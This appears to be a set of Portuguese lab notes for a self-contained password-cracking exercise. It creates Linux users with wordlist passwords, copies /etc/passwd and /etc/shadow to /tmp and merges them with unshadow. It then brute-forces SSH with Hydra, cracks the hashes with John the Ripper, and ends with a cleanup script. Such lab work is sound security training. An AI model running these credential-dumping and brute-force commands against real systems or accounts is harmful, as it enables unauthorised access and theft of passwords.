## Lista de nomes de usuários
```
USERNAMES=("aline" "adriano" "beatriz" "breno" "claudia" "carlos" "douglas" "daniele" "emilia" "eduardo" "fernando" "flavia" "geraldo" "gisele" "heitor" "helena" "isabela" "igor" "jorge" "julia" "laura" "leonardo" "marcos" "maria" "natasha" "nicolas" "oswaldo" "odete" "paula" "pedro" "ricardo" "rafaela" "sandra" "samuel" "talita" "tiago" "ursula" "umberto" "vania" "valdir" "zilda" "zacarias" )
```
## Download de wordlists
```
wget https://github.com/sergiorez-cmd/secbitrez/raw/refs/heads/main/wordlists/wordlists.zip
```
## Criar usuários no Linux e definir senhas via wordlist
```
sudo bash -c " \
for user in $USERNAMES; do 
	useradd \$user; 
	password=\$(shuf -n 1 /home/sergio/wordlists/john-passwd.txt); 
	echo \$user:\$password | chpasswd; 
	echo Creating user \"\$user\"...; 
done ;

echo 'All done!'
"
```
## Copiar arquivos de usuários e senhas do Linux para pasta tmp
```
sudo bash -c " \
cp /etc/passwd /tmp/passwd
cp /etc/shadow /tmp/shadow
"
```
## Converter arquivos de hash para o formato compativel do John The Ripper
```
sudo bash -c " \
unshadow /tmp/passwd /tmp/shadow > /tmp/hashes
"
```
## Executar Hydra para quebrar senhas de usuários via SSH
```
hydra -l name_user -P /usr/share/wordlists/john.lst ssh://<Target_IP>
```
## Executar John The Ripper para quebrar hashs das senhas dos usuários
```
john /tmp/hashes --wordlist=/usr/share/wordlists/john.lst --format=crypt
```
## Remover usuários do Linux
```#!/bin/bash

# Script para deletar usuários via lista em sistemas Linux
# Para utilizar esse script aplique permissão de execução via "$ chmod +x script_name.sh"

# Verifica se o script está sendo executado como root
if [ "$(id -u)" -ne 0 ]; then
  echo "Este script precisa ser executado com privilégios de root (use sudo)."
  exit 1
fi

# Verifica se foi passado um nome de arquivo como argumento
if [ -z "$1" ]; then
  echo "Uso: $0 <arquivo_com_lista_de_usuarios>"
  exit 1
fi

# Abre o arquivo de lista de usuários
while IFS= read -r user || [ -n "$user" ]; do
  if [ -n "$user" ]; then
    echo "Removendo o usuário: $user"
    # Tenta remover o usuário e seu home directory
    userdel -r "$user"
    if [ $? -eq 0 ]; then
      echo "Usuário $user removido com sucesso."
    else
      echo "Não foi possível remover o usuário $user."
    fi
  fi
done < "$1"

echo "Processo de remoção de usuários concluído."



```
